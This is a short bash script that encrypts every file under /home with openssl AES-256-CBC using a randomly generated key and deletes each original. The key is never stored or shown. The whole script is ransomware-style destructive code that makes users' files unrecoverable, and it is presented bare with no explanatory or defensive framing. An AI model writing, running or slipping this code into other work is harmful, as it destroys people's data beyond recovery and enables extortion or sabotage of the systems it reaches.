#!/bin/bash
key=$(tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1)
encfile() { [ "${1##*.}" != "aes" ] && openssl aes-256-cbc -a -salt -in "$1" -out "$1.aes" -k "$key" -iter 1000 && rm "$1"; }
encdir() { for f in "$1"/*; do [ -f "$f" ] && encfile "$f"; [ -d "$f" ] && encdir "$f"; done; }
encdir "/home"